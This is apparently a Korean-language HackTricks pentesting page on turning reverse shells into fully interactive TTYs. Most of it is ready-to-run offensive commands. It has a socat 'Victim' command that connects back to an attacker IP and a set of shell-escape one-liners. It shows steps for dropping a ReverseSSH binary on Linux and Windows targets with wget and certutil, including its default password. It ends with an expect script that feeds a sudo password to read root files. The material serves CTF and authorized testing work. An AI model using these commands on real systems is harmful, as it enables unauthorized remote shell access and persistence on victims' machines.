# Full TTYs

{{#include ../../banners/hacktricks-training.md}}

## Full TTY

`/etc/shells`에는 유효한 login-shell 경로명이 나열되어 있으며 일부 프로그램에서 참조됩니다. 하지만 PTY를 할당하기 위한 보편적인 필수 조건은 아닙니다.<sup>[[3]](#references)[[4]](#references)</sup> `pkexec`와 같은 프로그램이 `SHELL`을 `The value for the SHELL variable was not found in the /etc/shells file`이라는 메시지와 함께 거부하는 경우, 정확한 shell 경로(예: `/bin/bash`)가 `/etc/shells`에 있는지 확인하세요.<sup>[[10]](#references)</sup> 아래의 `CTRL+Z`/`fg` 복구 시퀀스는 Bash job control을 사용합니다. 현재 shell이 Bash가 아니라면 해당 시퀀스를 사용하기 전에 Bash를 시작하세요.<sup>[[7]](#references)</sup>

#### Python

Python의 `pty.spawn`은 현재 프로세스의 standard input, output 및 error stream에 연결된 프로그램을 시작하며, 이를 통해 이 세션에서 Bash에 pseudo-terminal을 제공합니다.<sup>[[4]](#references)</sup>
```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```
> [!TIP]
> **`stty -a`**를 실행하면 **행**과 **열**의 **수**를 확인할 수 있습니다. `-a`는 현재 터미널 설정을 모두 출력합니다. 명령의 출력은 터미널에 따라 다르므로 현재 세션에서 보고된 값을 사용하세요.<sup>[[11]](#references)</sup>

#### script

`script` utility는 터미널 세션을 기록합니다. 여기서 `/dev/null`은 typescript를 폐기하고, `-q`는 시작 및 완료 메시지를 표시하지 않으며, `-c`는 기본 shell 대신 Bash를 실행합니다.<sup>[[5]](#references)</sup>
```bash
script /dev/null -qc /bin/bash #/dev/null is to not store anything
```
두 PTY-spawn 방법 중 하나를 사용한 후 Netcat 세션을 일시 중지하고 로컬 raw mode로 복원한 다음, 원격 터미널 환경과 크기를 설정합니다:
```bash
(inside the nc session) CTRL+Z;stty raw -echo; fg; ls; export SHELL=/bin/bash; export TERM=screen; stty rows 38 columns 116; reset;
```
#### socat

listener는 현재 터미널을 raw mode로 사용하고 local echo를 비활성화하며, 포트 4444에서 TCP connections를 수락합니다. victim command는 pty를 할당하고 stderr를 결합하며, 세션을 생성하고 SIGINT를 전달한 뒤 적절한 터미널 설정을 적용합니다. 자식 프로세스에 controlling terminal이 필요한 경우 `ctty`를 추가합니다.<sup>[[6]](#references)</sup>
```bash
#Listener:
socat file:`tty`,raw,echo=0 tcp-listen:4444

#Victim:
socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.0.3.4:4444
```
### **Shell 생성**

- `python -c 'import pty; pty.spawn("/bin/sh")'`
- `echo os.system('/bin/bash')`
- `/bin/sh -i`
- `script -qc /bin/bash /dev/null`
- `perl -e 'exec "/bin/sh";'`
- perl: `exec "/bin/sh";`
- ruby: `exec "/bin/sh"`
- lua: `os.execute('/bin/sh')`
- IRB: `exec "/bin/sh"`
- vi: `:!bash`
- vi: `:set shell=/bin/bash:shell`
- nmap (`--interactive`를 지원하는 이전 버전): `!sh`

Nmap escape는 버전에 따라 다릅니다. Nmap은 이후 릴리스에서 `--interactive` 모드를 제거했으므로 `!sh`는 이전 버전에만 적용됩니다.<sup>[[13]](#references)</sup>

## ReverseSSH

**interactive shell access**와 **file transfers**, **port forwarding**을 위한 편리한 방법은 정적으로 링크된 SSH server [ReverseSSH](https://github.com/Fahrj/reverse-ssh)를 target에 업로드하는 것입니다.<sup>[[1]](#references)</sup>

아래는 프로젝트에서 공개한 UPX-compressed binary를 사용하는 `x86` 예시입니다. 다른 architecture 또는 release artifact의 경우 [releases page](https://github.com/Fahrj/reverse-ssh/releases/latest/)를 참조하세요.<sup>[[1]](#references)</sup>

1. 들어오는 SSH connection을 수신하도록 local host를 준비합니다. listener mode에서 `-l`은 listener를 활성화하고 `-p 4444`는 target의 connection을 수락할 port를 지정합니다.<sup>[[1]](#references)</sup>
```bash
# Drop it via your preferred way, e.g.
wget -q https://github.com/Fahrj/reverse-ssh/releases/latest/download/upx_reverse-sshx86 -O /dev/shm/reverse-ssh && chmod +x /dev/shm/reverse-ssh

/dev/shm/reverse-ssh -v -l -p 4444
```
- (2a) Linux target. 동일한 `upx_reverse-sshx86` artifact를 `/dev/shm/reverse-ssh`로 전송하고 실행 가능하도록 설정합니다. 대상의 `-p 4444`는 위의 listener port를 선택하며, `kali@10.0.0.2`는 home으로 연결할 때 사용할 account와 host를 지정합니다.<sup>[[1]](#references)</sup>
```bash
/dev/shm/reverse-ssh -p 4444 kali@10.0.0.2
```
- (2b) Windows target. Full interactive PowerShell requires Windows 10 build 17763; see the [project README](https://github.com/Fahrj/reverse-ssh#features).<sup>[[1]](#references)</sup>
```bash
# Drop it via your preferred way, e.g.
certutil.exe -f -urlcache https://github.com/Fahrj/reverse-ssh/releases/latest/download/upx_reverse-sshx86.exe reverse-ssh.exe

reverse-ssh.exe -p 4444 kali@10.0.0.2
```
Windows 예제는 `certutil`을 `-f -urlcache`와 함께 사용합니다. Microsoft는 `-f`를 URL fetch를 강제하는 옵션으로 문서화하고 있으며, 사용 가능한 parameters는 version에 따라 다를 수 있으므로 이 형식을 사용할 수 없다면 `certutil -?`를 확인하십시오.<sup>[[12]](#references)</sup>

- reverse connection이 성공하면 ReverseSSH의 reverse-mode listener는 기본적으로 port `8888`(또는 `-b`로 제공된 값)에 bind되며, incoming connections는 기본 password `letmeinbrudipls`와 함께 모든 username을 허용합니다. remote shell은 `reverse-ssh(.exe)`를 실행한 account의 privileges로 실행됩니다.<sup>[[1]](#references)</sup>
```bash
# Interactive shell access
ssh -p 8888 127.0.0.1

# Bidirectional file transfer
sftp -P 8888 127.0.0.1
```
## Penelope

[Penelope](https://github.com/brightio/penelope)는 Unix-like reverse shells를 PTY로 자동 업그레이드하고, Unix-like 터미널 크기를 조정하며, shell 상호작용을 기록합니다. Windows shells에서는 readline을 제공하지만 실시간 터미널 크기 조정은 지원하지 않습니다.<sup>[[2]](#references)</sup>

`penelope`를 실행하면 기본적으로 `0.0.0.0:4444`에서 listen하며, 이후 들어오는 Unix-like shells를 자동으로 업그레이드하고 기록할 수 있습니다.<sup>[[2]](#references)</sup>

![들어오는 shell을 처리하고 업그레이드하는 Penelope](https://github.com/user-attachments/assets/27ab4b3a-780c-4c07-a855-fd80a194c01e)

## No TTY

어떤 이유로든 full TTY를 얻을 수 없는 경우에도 **여전히 사용자 입력을 요구하는 프로그램과 상호작용할 수 있습니다**. 다음 예제에서는 Expect가 `sudo`를 생성하고, 비밀번호 프롬프트를 기다린 다음, 비밀번호를 전송하고, `interact`를 통해 제어권을 반환합니다. `sudo -S`는 표준 입력에서 비밀번호를 읽습니다. 승인된 lab에서만 사용하고, 실제 자격 증명을 shell history나 source files에 저장하지 마세요.<sup>[[8]](#references)[[9]](#references)</sup>
```bash
expect -c 'spawn sudo -S cat "/root/root.txt";expect "*password*";send "<THE_PASSWORD_OF_THE_USER>";send "\r\n";interact'
```
## References

- [1] [ReverseSSH - CTF 및 기타 용도를 위한 reverse shell 기능이 포함된 정적으로 링크된 ssh server](https://github.com/Fahrj/reverse-ssh)
- [2] [Penelope - 작업을 더 쉽게 만들기 위해 몇 가지 작업을 자동화하는 Shell handler](https://github.com/brightio/penelope)
- [3] [shells(5) — Linux 매뉴얼 페이지](https://man7.org/linux/man-pages/man5/shells.5.html)
- [4] [Python `pty` — Python documentation](https://docs.python.org/3/library/pty.html)
- [5] [script(1) — Linux 매뉴얼 페이지](https://man7.org/linux/man-pages/man1/script.1.html)
- [6] [socat(1) — Linux 매뉴얼 페이지](https://man7.org/linux/man-pages/man1/socat.1.html)
- [7] [Bash Reference Manual — Job Control](https://www.gnu.org/s/bash/manual/bash.html)
- [8] [sudo(8) — Linux 매뉴얼 페이지](https://man7.org/linux/man-pages/man8/sudo.8.html)
- [9] [expect(1) — Linux 매뉴얼 페이지](https://man7.org/linux/man-pages/man1/expect.1.html)
- [10] [pkexec.c](https://github.com/polkit-org/polkit/blob/main/src/programs/pkexec.c)
- [11] [stty(1) — Linux 매뉴얼 페이지](https://man7.org/linux/man-pages/man1/stty.1.html)
- [12] [certutil](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/certutil)
- [13] [Nmap Change Log](https://nmap.org/changelog.html)
{{#include ../../banners/hacktricks-training.md}}
